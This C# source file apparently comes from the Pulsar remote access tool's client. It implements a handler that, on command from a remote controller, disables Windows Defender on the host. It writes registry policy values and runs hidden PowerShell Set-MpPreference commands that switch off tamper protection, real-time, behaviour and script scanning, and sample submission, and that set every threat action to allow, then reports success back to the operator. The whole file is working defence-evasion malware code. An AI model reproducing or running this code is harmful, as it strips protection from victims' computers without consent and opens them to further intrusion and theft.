using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Networking;
namespace Pulsar.Client.FunStuff
{
    public class WindowsDefenderDisabler : IDisposable
    {
        private bool _disposed = false;

        public void Handle(DoDisableDefender message, ISender client)
        {
            if (!IsAdministrator())
            {
                client.Send(new SetStatus { Message = "Error: Administrator privileges required to modify Windows Defender settings." });
                return;
            }

            try
            {
                if (message.Disable)
                {
                    DisableWindowsDefender(client);
                }
                else
                {
                    RestoreWindowsDefender(client);
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to configure Windows Defender: {ex.Message}" });
            }
        }

        private bool IsAdministrator()
        {
            try
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                    .IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private void DisableWindowsDefender(ISender client)
        {
            client.Send(new SetStatus { Message = "Disabling Windows Defender..." });

            // Registry modifications to disable
            var disableSettings = new[]
            {
                (@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", 0),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", 1),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", 1)
            };

            foreach (var (path, name, value) in disableSettings)
            {
                SetRegistryValue(path, name, value);
            }

            // PowerShell configurations to disable
            ConfigureViaPowerShell(false);

            client.Send(new SetStatus { Message = "Windows Defender disabled successfully" });
        }

        private void RestoreWindowsDefender(ISender client)
        {
            client.Send(new SetStatus { Message = "Restoring Windows Defender..." });

            // Registry modifications to restore
            var restoreSettings = new[]
            {
                (@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", 5), // Default value
                (@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 0),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 0),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", 0),
                (@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", 0)
            };

            foreach (var (path, name, value) in restoreSettings)
            {
                SetRegistryValue(path, name, value);
            }

            // PowerShell configurations to restore
            ConfigureViaPowerShell(true);

            client.Send(new SetStatus { Message = "Windows Defender restored successfully" });
        }

        private void SetRegistryValue(string path, string valueName, int value)
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(path, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key?.SetValue(valueName, value, RegistryValueKind.DWord);
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Tamper Protection is likely enabled, we'll handle this via PowerShell
                Debug.WriteLine($"Access denied to registry path: {path} - Tamper Protection may be enabled");
                // Don't throw - we'll try other methods
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to set registry value {valueName} in {path}: {ex.Message}");
                // Continue with other operations
            }
        }

        private void ConfigureViaPowerShell(bool enable)
        {
            var powerShellCommands = enable ? GetEnableCommands() : GetDisableCommands();

            foreach (var command in powerShellCommands)
            {
                ExecutePowerShellCommand(command);
            }
        }

        private string[] GetDisableCommands()
        {
            return new[]
            {
        // First disable Tamper Protection via PowerShell (if available)
        "Set-MpPreference -DisableTamperProtection $true",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Set-MpPreference -DisablePrivacyMode $true",
        "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
        "Set-MpPreference -DisableArchiveScanning $true",
        "Set-MpPreference -DisableIntrusionPreventionSystem $true",
        "Set-MpPreference -DisableScriptScanning $true",
        "Set-MpPreference -SubmitSamplesConsent 2",
        "Set-MpPreference -MAPSReporting 0",
        "Set-MpPreference -HighThreatDefaultAction 6 -Force",
        "Set-MpPreference -ModerateThreatDefaultAction 6",
        "Set-MpPreference -LowThreatDefaultAction 6",
        "Set-MpPreference -SevereThreatDefaultAction 6"
    };
        }

        private string[] GetEnableCommands()
        {
            return new[]
            {
        // Re-enable Tamper Protection
        "Set-MpPreference -DisableTamperProtection $false",
        "Set-MpPreference -DisableRealtimeMonitoring $false",
        "Set-MpPreference -DisableBehaviorMonitoring $false",
        "Set-MpPreference -DisableBlockAtFirstSeen $false",
        "Set-MpPreference -DisableIOAVProtection $false",
        "Set-MpPreference -DisablePrivacyMode $false",
        "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false",
        "Set-MpPreference -DisableArchiveScanning $false",
        "Set-MpPreference -DisableIntrusionPreventionSystem $false",
        "Set-MpPreference -DisableScriptScanning $false",
        "Set-MpPreference -SubmitSamplesConsent 1",
        "Set-MpPreference -MAPSReporting 1",
        "Set-MpPreference -HighThreatDefaultAction 1 -Force",
        "Set-MpPreference -ModerateThreatDefaultAction 1",
        "Set-MpPreference -LowThreatDefaultAction 1",
        "Set-MpPreference -SevereThreatDefaultAction 1"
    };
        }

        private void ExecutePowerShellCommand(string command)
        {
            try
            {
                using (var process = new Process())
                {
                    process.StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-Command \"{command}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    process.Start();
                    process.WaitForExit(15000); // 15 second timeout
                }
            }
            catch (Exception ex)
            {
                // Log but don't throw - individual PowerShell failures shouldn't stop the whole process
                Debug.WriteLine($"Error executing PowerShell command '{command}': {ex.Message}");
            }
        }

        #region IDisposable Implementation

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                _disposed = true;
            }
        }

        ~WindowsDefenderDisabler()
        {
            Dispose(false);
        }

        #endregion
    }
}